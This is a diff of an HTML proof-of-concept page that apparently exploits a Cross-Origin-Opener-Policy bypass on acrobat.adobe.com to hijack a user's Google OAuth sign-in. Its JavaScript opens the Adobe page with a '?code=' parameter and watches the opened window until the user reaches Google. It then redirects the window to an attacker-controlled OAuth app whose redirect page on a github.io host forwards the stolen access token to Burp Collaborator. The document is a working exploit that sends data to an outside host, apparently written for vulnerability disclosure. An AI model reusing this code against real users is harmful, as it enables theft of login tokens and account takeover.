@@ -1,150 +1,151 @@
-<!DOCTYPE html>                                                                                                                                                                                                                                    
-  <html>                                 
-  <head>                                                                                                                                                                                                                                             
+<!DOCTYPE html>
+  <html>
+  <head>
   <title>COOP Bypass PoC - Adobe Acrobat OAuth Hijack</title>
-  <style>                                                                                                                                                                                                                                            
+  <style>
     body { font-family: Arial, sans-serif; background: #0d1117; color: #e6edf3;
-           display: flex; flex-direction: column; align-items: center;                                                                                                                                                                               
-           padding: 40px 20px; }                            
-    h1 { color: #ff6b6b; }                                                                                                                                                                                                                           
+           display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
+    h1 { color: #ff6b6b; margin-bottom: 4px; }
+    .sub { color: #8b949e; font-size: 13px; margin-bottom: 20px; }
     .box { background: #161b22; border: 1px solid #30363d; border-radius: 8px;
-           padding: 20px; margin: 12px 0; width: 620px; }                                                                                                                                                                                            
+           padding: 18px; margin: 10px 0; width: 640px; }
     .label { color: #8b949e; font-size: 11px; text-transform: uppercase;
-             letter-spacing: 1px; margin-bottom: 6px; }                                                                                                                                                                                              
-    .green { color: #3fb950; font-weight: bold; font-size: 14px; }
-    .red   { color: #f85149; font-weight: bold; font-size: 14px; }                                                                                                                                                                                   
-    .gray  { color: #8b949e; font-size: 13px; }                                                                                                                                                                                                      
-    code { background: #21262d; padding: 2px 6px; border-radius: 4px;                                                                                                                                                                                
-           font-size: 12px; color: #79c0ff; }                                                                                                                                                                                                        
-    button { background: #238636; color: white; border: none; padding: 14px 32px;
-             font-size: 16px; border-radius: 6px; cursor: pointer; margin: 16px 0; }                                                                                                                                                                 
-    button:hover { background: #2ea043; }                                                                                                                                                                                                            
-    #log { font-family: monospace; font-size: 12px; height: 220px;                                                                                                                                                                                   
-           overflow-y: auto; background: #0d1117; padding: 10px;                                                                                                                                                                                     
-           border: 1px solid #21262d; border-radius: 4px; } 
-    .step { border-left: 3px solid #238636; padding-left: 10px; margin: 6px 0; }                                                                                                                                                                     
-  </style>                                                                                                                                                                                                                                           
-  </head>                                                                                                                                                                                                                                            
-  <body>                                                                                                                                                                                                                                             
-                                                            
-  <h1>COOP Fix Bypass — Adobe Acrobat OAuth Hijacking</h1>                                                                                                                                                                                           
-  
-  <div class="box">                                                                                                                                                                                                                                  
-    <div class="label">Bypass Mechanism</div>               
-    The fix sets <code>Cross-Origin-Opener-Policy: same-origin-allow-popups</code>
-    but any request with <code>?code=</code> in the URL overrides COOP to                                                                                                                                                                            
-    <code>unsafe-none</code>, fully restoring attacker window control.                                                                                                                                                                               
-    <br><br>                                                                                                                                                                                                                                         
-    <span class="red">Normal: </span><code>acrobat.adobe.com/</code> →                                                                                                                                                                               
-    <code>COOP: same-origin-allow-popups</code> ← protected<br>                                                                                                                                                                                      
-    <span class="green">Bypass: </span><code>acrobat.adobe.com/?code=x</code> →                                                                                                                                                                      
-    <code>COOP: unsafe-none</code> ← vulnerable                                                                                                                                                                                                      
-  </div>                                                                                                                                                                                                                                             
-                                                            
-  <div class="box">                                                                                                                                                                                                                                  
-    <div class="label">Steps</div>                          
-    <div class="step gray">1. Click Launch Exploit below</div>
-    <div class="step gray">2. In the Adobe window — click Sign In → Continue with Google</div>                                                                                                                                                       
-    <div class="step gray">3. Watch the log — attacker hijacks the OAuth flow</div>
-    <div class="step gray">4. Complete Google sign-in — token is stolen and sent to attacker</div>                                                                                                                                                   
-  </div>                                                                                                                                                                                                                                             
-                                                                                                                                                                                                                                                     
-  <button onclick="launch()">▶ Launch Exploit</button>                                                                                                                                                                                               
-                                                            
-  <div class="box">                                                                                                                                                                                                                                  
-    <div id="log"></div>                                    
+             letter-spacing: 1px; margin-bottom: 8px; }
+    .green { color: #3fb950; font-weight: bold; }
+    .red   { color: #f85149; font-weight: bold; }
+    .gray  { color: #8b949e; font-size: 13px; }
+    code { background: #21262d; padding: 2px 6px; border-radius: 4px;
+           font-size: 12px; color: #79c0ff; }
+    button { background: #238636; color: white; border: none; padding: 14px 36px;
+             font-size: 16px; border-radius: 6px; cursor: pointer; margin: 14px 0; }
+    button:hover { background: #2ea043; }
+    #log { font-family: monospace; font-size: 12px; height: 220px;
+           overflow-y: auto; background: #0d1117; padding: 10px;
+           border: 1px solid #21262d; border-radius: 4px; }
+    .step { padding: 6px 0 6px 12px; border-left: 3px solid #388bfd;
+            margin: 5px 0; color: #e6edf3; font-size: 13px; }
+    .step b { color: #79c0ff; }
+  </style>
+  </head>
+  <body>
+
+  <h1>COOP Fix Bypass — Adobe Acrobat OAuth Hijacking</h1>
+  <div class="sub">CVE: OAuth Flow Hijacking via COOP unsafe-none override</div>
+
+  <div class="box">
+    <div class="label">The Bypass</div>
+    Fix sets <code>COOP: same-origin-allow-popups</code> on all pages.<br>
+    But any URL with <code>?code=</code> overrides it to <code>COOP: unsafe-none</code>
+    — restoring full attacker window control.
+    <br><br>
+    <span style="color:#f85149">Protected: </span>
+    <code>acrobat.adobe.com/link/home/</code>
+    → <code>COOP: same-origin-allow-popups</code><br>
+    <span style="color:#3fb950">Bypassed:  </span>
+    <code>acrobat.adobe.com/link/home/recent/?code=x</code>
+    → <code>COOP: unsafe-none</code>
+  </div>
+
+  <div class="box">
+    <div class="label">Steps — Follow after clicking Launch</div>
+    <div class="step"><b>1.</b> Adobe opens → wait for it to load fully</div>
+    <div class="step"><b>2.</b> Click <b>Sign In</b> on the Adobe page</div>
+    <div class="step"><b>3.</b> Click <b>Continue with Google</b></div>
+    <div class="step"><b>4.</b> Watch the log below — attacker auto-hijacks the OAuth</div>
+    <div class="step"><b>5.</b> Complete Google sign-in — token stolen + sent to Burp</div>
+  </div>
+
+  <button onclick="launch()">▶ Launch Exploit</button>
+
+  <div class="box">
+    <div class="label">Live Attack Log</div>
+    <div id="log"></div>
   </div>
 
   <script>
   var victim;
-  var oauthDetected    = false;                                                                                                                                                                                                                      
   var redirectAttempted = false;
-                                                                                                                                                                                                                                                     
-  // BYPASS: ?code= forces COOP unsafe-none on acrobat.adobe.com                                                                                                                                                                                     
-  var urlParam = "https://acrobat.adobe.com/?code=bypass_poc";                                                                                                                                                                                       
-                                                                                                                                                                                                                                                     
-  // Attacker's OAuth app — token gets sent to steal_token.html then to Burp                                                                                                                                                                         
-  var attackOAuthURL = "https://accounts.google.com/o/oauth2/v2/auth" +
-      "?client_id=444585205614-q23dugka7fsplo2m9l4vue8bnrneicp2.apps.googleusercontent.com" +                                                                                                                                                        
-      "&redirect_uri=https%3A%2F%2Flearningmanagerstage4.github.io%2Fkamal%2Fsteal_token.html" +                                                                                                                                                     
-      "&response_type=token" +                                                                                                                                                                                                                       
-      "&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile" +                                                                                                                                                                          
-      "%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email";                                                                                                                                                                                 
-                                                                                                                                                                                                                                                     
-  function log(msg, cls) {                                                                                                                                                                                                                           
-      var el = document.getElementById('log');                                                                                                                                                                                                       
-      var d  = document.createElement('div');               
-      d.className = cls || 'gray';                                                                                                                                                                                                                   
-      d.textContent = '[' + new Date().toLocaleTimeString() + ']  ' + msg;
-      el.appendChild(d);                                                                                                                                                                                                                             
-      el.scrollTop = el.scrollHeight;                       
-  }                                                                                                                                                                                                                                                  
-                                                            
-  function verifyCOOPBypass() {
-      // With COOP: same-origin-allow-popups → victim is null (severed)
-      // With COOP: unsafe-none (our bypass) → victim is a live Window object                                                                                                                                                                        
-      if (!victim || victim.closed) {                                                                                                                                                                                                                
-          log('Popup was blocked — allow popups and click again.', 'red');                                                                                                                                                                           
-          return false;                                                                                                                                                                                                                              
-      }                                                                                                                                                                                                                                              
-      log('BYPASS CONFIRMED: victim window is live — COOP did not sever the reference', 'green');                                                                                                                                                    
-      log('foo.location.replace() is allowed — attacker controls victim navigation', 'green');                                                                                                                                                       
-      return true;                                                                                                                                                                                                                                   
-  }                                                                                                                                                                                                                                                  
-                                                                                                                                                                                                                                                     
-  function monitorFrames() {                                                                                                                                                                                                                         
-      if (!victim || victim.closed || redirectAttempted) return;
-                                                                                                                                                                                                                                                     
-      try {                                                 
-          var f = victim.frames.length;
-          log('Monitoring victim window... frames = ' + f);                                                                                                                                                                                          
-                                                                                                                                                                                                                                                     
-          if (f == 2 && !oauthDetected) {                                                                                                                                                                                                            
-              oauthDetected = true;                                                                                                                                                                                                                  
-              log('OAuth flow detected (Google iframe loaded, frame count = 2)', 'green');                                                                                                                                                           
-          }                                                                                                                                                                                                                                          
-      } catch(e) {                                                                                                                                                                                                                                   
-          // Cross-origin exception = victim navigated away from acrobat.adobe.com                                                                                                                                                                   
-          log('Cross-origin block — victim is now at Google OAuth page', 'green');                                                                                                                                                                   
-                                                                                                                                                                                                                                                     
-          if (oauthDetected && !redirectAttempted) {                                                                                                                                                                                                 
-              redirectAttempted = true;                                                                                                                                                                                                              
-              log('Hijacking OAuth flow — redirecting victim to attacker OAuth app...', 'green');                                                                                                                                                    
-                                                                                                                                                                                                                                                     
-              setTimeout(function() {                                                                                                                                                                                                                
-                  try {                                                                                                                                                                                                                              
-                      // This works because COOP is unsafe-none (bypass active)                                                                                                                                                                      
-                      victim.location.replace(attackOAuthURL);                                                                                                                                                                                       
-                      log('SUCCESS: victim redirected to attacker Google OAuth app', 'green');
-                      log('Waiting for victim to complete sign-in...', 'gray');                                                                                                                                                                      
-                      log('Token will appear in steal_token.html and Burp Collaborator', 'gray');
-                  } catch(e2) {                                                                                                                                                                                                                      
-                      log('Redirect failed: ' + e2.message, 'red');
-                  }                                                                                                                                                                                                                                  
-              }, 1);                                        
-          }                                                                                                                                                                                                                                          
-      }                                                     
 
-      setTimeout(monitorFrames, 500);
+  // BYPASS: ?code= on sub-route forces COOP unsafe-none
+  // /recent/ path avoids being treated as OAuth callback by Adobe SPA
+  var urlParam = "https://acrobat.adobe.com/link/home/recent/?code=bypass_poc";
+
+  var attackOAuthURL =
+      "https://accounts.google.com/o/oauth2/v2/auth" +
+      "?client_id=444585205614-q23dugka7fsplo2m9l4vue8bnrneicp2.apps.googleusercontent.com" +
+      "&redirect_uri=https%3A%2F%2Flearningmanagerstage4.github.io%2Fkamal%2Fsteal_token.html" +
+      "&response_type=token" +
+      "&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile" +
+      "%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email";
+
+  function log(msg, cls) {
+      var el = document.getElementById('log');
+      var d  = document.createElement('div');
+      d.className = cls || 'gray';
+      d.textContent = '[' + new Date().toLocaleTimeString() + ']  ' + msg;
+      el.appendChild(d);
+      el.scrollTop = el.scrollHeight;
   }
 
-  function launch() {                                                                                                                                                                                                                                
-      oauthDetected     = false;
-      redirectAttempted = false;                                                                                                                                                                                                                     
-                                                            
-      log('Opening: ' + urlParam);
-      victim = window.open(urlParam, '_blank', 'width=700,height=600');
-                                                                                                                                                                                                                                                     
-      setTimeout(function() {                                                                                                                                                                                                                        
-          log('Verifying COOP bypass...');                                                                                                                                                                                                           
-          var ok = verifyCOOPBypass();                                                                                                                                                                                                               
-          if (ok) {                                         
-              log('Starting OAuth flow monitor...', 'green');
-              monitorFrames();                                                                                                                                                                                                                       
+  function verifyCOOPBypass() {
+      if (!victim || victim.closed) {
+          log('Popup blocked — allow popups for this site and retry.', 'red');
+          return false;
+      }
+      // foo is a live Window = COOP did NOT sever the reference = bypass confirmed
+      log('BYPASS CONFIRMED: opener reference is live (COOP: unsafe-none active)', 'green');
+      log('Attacker can call victim.location.replace() at any time', 'green');
+      return true;
+  }
+
+  function monitor() {
+      if (!victim || victim.closed || redirectAttempted) return;
+
+      try {
+          // Accessing any property of a cross-origin window throws
+          // Same-origin: no throw, window is still on acrobat.adobe.com
+          var dummy = victim.location.hostname;
+          log('Waiting for victim to click Sign In → Continue with Google...', 'gray');
+      } catch(e) {
+          // Cross-origin exception = victim navigated to accounts.google.com
+          // This is the exact moment to hijack
+          if (!redirectAttempted) {
+              redirectAttempted = true;
+              log('Victim reached Google sign-in page — hijacking OAuth now!', 'green');
+
+              setTimeout(function() {
+                  try {
+                      victim.location.replace(attackOAuthURL);
+                      log('SUCCESS: Victim redirected to attacker Google OAuth app', 'green');
+                      log('Waiting for victim to complete sign-in...', 'gray');
+                      log('Token will appear at steal_token.html + Burp Collaborator', 'gray');
+                  } catch(err) {
+                      log('Redirect blocked: ' + err.message, 'red');
+                  }
+              }, 50);
           }
-      }, 2000);                                                                                                                                                                                                                                      
-  }                                                         
+      }
+
+      setTimeout(monitor, 300);
+  }
+
+  function launch() {
+      redirectAttempted = false;
+      document.getElementById('log').innerHTML = '';
+
+      log('Opening: ' + urlParam);
+      victim = window.open(urlParam, '_blank', 'width=720,height=620');
+
+      setTimeout(function() {
+          log('Verifying COOP bypass...');
+          var ok = verifyCOOPBypass();
+          if (ok) {
+              log('Monitoring victim window for Google OAuth navigation...', 'gray');
+              monitor();
+          }
+      }, 2000);
+  }
   </script>
 
-  </body>                                                                                                                                                                                                                                            
+  </body>
   </html>
